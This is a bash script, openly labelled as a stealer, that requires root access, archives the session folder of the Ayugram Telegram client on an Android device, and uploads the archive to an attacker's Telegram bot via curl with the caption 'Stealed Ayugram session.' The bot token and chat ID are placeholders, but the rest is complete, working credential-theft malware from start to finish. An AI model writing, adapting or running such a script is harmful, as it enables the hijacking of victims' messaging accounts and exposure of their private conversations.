
     #!/bin/bash

TELEGRAM_BOT_TOKEN="TOKEN"
 сообщение
CHAT_ID="ID"


FOLDER_PATH="/data/data/com.radolyn.ayugram/files/account1"

if [ "$(id -u)" != "0" ]; then
    echo "Error: Superuser permissions required." >&2
    exit 1
fi

if [ ! -d "$FOLDER_PATH" ]; then
  exit 1
fi

TAR_FILE="session.tar.gz"
TEMP_DIR=$(mktemp -d)

tar -czf "$TEMP_DIR/$TAR_FILE" -C "$(dirname "$FOLDER_PATH")" "$(basename "$FOLDER_PATH")"

if [ $? -ne 0 ]; then
  exit 1
fi

MESSAGE="👤 Stealed Ayugram session."

curl -s -F chat_id="$CHAT_ID" -F document=@"$TEMP_DIR/$TAR_FILE" -F caption="$MESSAGE" "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument"

rm -rf "$TEMP_DIR"

  
